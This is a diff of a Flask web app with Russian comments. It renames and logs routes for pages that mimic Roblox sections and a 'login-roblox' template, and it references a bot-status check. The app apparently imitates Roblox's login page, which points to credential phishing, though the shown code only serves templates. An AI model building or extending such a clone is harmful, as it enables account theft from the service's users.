@@ -356,34 +356,46 @@ def check_bot_status():
         logger.error(f"Бот не отвечает: {e}")
         return False
 
-# Flask маршруты для HTML страниц
-@app.route('/')
-def home():
+# Маршруты Flask
+@app.route('/', endpoint='index')
+def index():
+    logger.info("Запрос на /")
     return render_template('index.html')
 
-@app.route('/top-trending')
+@app.route('/toptrending', endpoint='top_trending')
 def top_trending():
+    logger.info("Запрос на /toptrending")
     return render_template('toptrending.html')
 
-@app.route('/login')
-def login():
-    return render_template('login-roblox.html')  # Этот шаблон должен быть в папке templates
+@app.route('/login-roblox', endpoint='login_roblox')
+def login_roblox():
+    logger.info("Запрос на /login-roblox")
+    return render_template('login-roblox.html')
 
-@app.route('/up-and-coming')
+@app.route('/upandcoming', endpoint='up_and_coming')
 def up_and_coming():
+    logger.info("Запрос на /upandcoming")
     return render_template('upandcoming.html')
 
-@app.route('/fun-with-friends')
+@app.route('/funwithfriends', endpoint='fun_with_friends')
 def fun_with_friends():
+    logger.info("Запрос на /funwithfriends")
     return render_template('funwithfriends.html')
 
-@app.route('/hot-right-now')
+@app.route('/hotrightnow', endpoint='hot_right_now')
 def hot_right_now():
+    logger.info("Запрос на /hotrightnow")
     return render_template('hotrightnow.html')
 
-@app.route('/top-revisited')
+@app.route('/toprevisted', endpoint='top_revisited')
 def top_revisited():
+    logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
+
+@app.route('/404', endpoint='not_found')
+def not_found():
+    logger.info("Запрос на /404")
+    return render_template('404.html')
 
 @app.errorhandler(404)
 def handle_404(e):
